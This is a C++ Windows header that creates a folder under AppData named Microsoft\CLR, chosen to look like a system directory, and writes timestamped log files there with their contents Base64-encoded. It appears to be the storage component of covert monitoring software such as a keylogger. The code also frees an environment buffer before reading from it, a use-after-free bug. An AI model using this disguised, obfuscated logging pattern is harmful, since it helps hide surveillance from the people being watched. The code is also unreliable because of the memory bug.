#ifndef IO_H
#define IO_H


#include <string>
#include <cstdlib>
#include <windows.h>
#include <fstream>

#include "Helper.h"
#include "Base64.h"



namespace IO {
	
	std::string getOurPath(const bool append_separator = false) {
		//"C:\Users\Chen\AppData\Roaming"

		char *env_buf = nullptr;
		//size_t sz = 0;
		_dupenv_s(&env_buf, nullptr, "APPDATA");
		free(env_buf);


		std::string appdata_dir(env_buf);
		std::string full = appdata_dir + "\\Microsoft\\CLR";
		return full + (append_separator ? "\\" : "");
	}

	bool MkOneDr(std::string path) {
		return (bool)CreateDirectory(path.c_str(), nullptr) || GetLastError()==ERROR_ALREADY_EXISTS;
	}

	bool MkDir(std::string path) {
		for (char &c : path) {
			if (c == '\\') {
				c = '\0';
				if (!MkOneDr(path))
					return false;
				c = '\\';
			}
		}
		return true;
	}

	template<class T>
	std::string writeLog(const T &t) {
		std::string path = getOurPath(true);
		Helper::DateTime dt;
		std::string name = dt.getDateTimeString("_") + ".log";

		try {
			std::ofstream file(path + name);
			if (!file) return "";
			std::ostringstream s;
			s << "[" << dt.getDateTimeString() << "]" <<
				std::endl << t << std::endl;
			std::string data = Base64::EncryptB64(s.str());
			file << data;
			if (!file) return "";
			file.close();
			return name;
		}
		catch (...) {
			return "";
		}
	}

}

#endif